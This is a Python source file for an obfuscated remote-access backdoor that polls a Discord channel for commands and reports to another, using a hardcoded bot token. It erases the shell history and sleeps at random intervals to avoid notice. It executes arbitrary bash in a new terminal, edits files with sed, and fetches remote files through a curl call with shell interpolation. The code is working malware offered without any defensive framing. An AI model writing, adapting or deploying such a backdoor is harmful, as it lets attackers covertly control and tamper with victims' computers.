import http.client as _H9
import sys as _S7
import json as _J3
import time as _T5
import socket as _K8
import random as _R2
import subprocess as _P4

_RS8 = 0
_TKN2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
_HDRS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_TKN2}'}
_IDN = _K8.gethostname().split('.')[0]

def _SN3(_MSG):
    _DT = {"content": _MSG}
    _JSN = _J3.dumps(_DT)
    _CN = _H9.HTTPSConnection("discord.com")
    _URL = f"/api/v10/channels/1342067836415381565/messages"
    _CN.request("POST", _URL, body=_JSN, headers=_HDRS)
    _CN.getresponse()
    _CN.close()

def _EX():
    print("Exiting...")
    _SN3(f"❌ `[{_IDN}] is deactivated`")
    _S7.exit()

def _RV():
    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)

def _NM():
    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)

def _RG():
    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)

def _LF():
    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)

def _NT(_RS):
    _P4.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_RS}'])

def _SD(_RS):
    _RS_SP = _RS.split('?')
    _P4.run(['sed', '-i', f'{_RS_SP[0]}', f'{_RS_SP[1]}'], check=True)

def _FF(_RS):
    _P4.run(['firefox', '--new-tab', f'{_RS}'], check=True)

def _OP_IMG(_RS):
    _P4.run(f'curl "{_RS}" -o img.jpg', shell=True, check=True)
    _P4.run(['xdg-open', 'img.jpg'], check=True)

def _LCH_PRE(_RS):
    match _RS:
        case "exit":
            _EX()
        case "activated":
            _SN3(f"✅ `[{_IDN}] is activated`")
        case "inverted screen":
            _RV()
        case "normal screen":
            _NM()
        case "right screen":
            _RG()
        case "left screen":
            _LF()
        case _:
            return

def _LCH_CST(_SP_RS):
    match _SP_RS[0]:
        case "newterm":
            _NT(_SP_RS[1])
        case "sed":
            _SD(_SP_RS[1])
        case "firefox":
            _FF(_SP_RS[1])
        case "openimg":
            _OP_IMG(_SP_RS[1])
        case _:
            return

def _MN():
    global _RS8
    _P4.run(f'rm ~/.zsh_history', shell=True, check=True)
    while True:
        try:
            _CN = _H9.HTTPSConnection("discord.com")
            _URL = f"/api/v10/channels/1341791654503514122/messages?limit=1"
            _CN.request("GET", _URL, headers=_HDRS)
            _RESP = _CN.getresponse()
            _CONTENT = _RESP.read().decode("utf-8")
            _JSN = _J3.loads(_CONTENT)

            _VAL = _JSN[0]['content']
            _VLS = _VAL.split('$')
            if len(_VLS) == 2:
                if _VLS[0] != _IDN:
                    _T5.sleep(1)
                    continue
                if _RS8 != _VLS[1]:
                    _RS8 = _VLS[1]
                    _SP_RS = _RS8.split('!')
                    if len(_SP_RS) == 2:
                        _LCH_CST(_SP_RS)
                    else:
                        _LCH_PRE(_RS8)
            elif len(_VLS) == 1:
                if _RS8 != _VLS[0]:
                    _RS8 = _VLS[0]
                    _SP_RS = _RS8.split('!')
                    if len(_SP_RS) == 2:
                        _LCH_CST(_SP_RS)
                    else:
                        _LCH_PRE(_RS8)
            _T5.sleep(_R2.randint(1, 15))
        except Exception as _E:
            if _E.args[0] == 0:
                _T5.sleep(_R2.randint(5, 20))
            else:
                _SN3(f"❌ `[{_IDN}] Error: {_E}`")
                _T5.sleep(_R2.randint(5, 20))

if __name__ == "__main__":
    _SN3(f"✅ `[{_IDN}] is activated`")
    _MN()
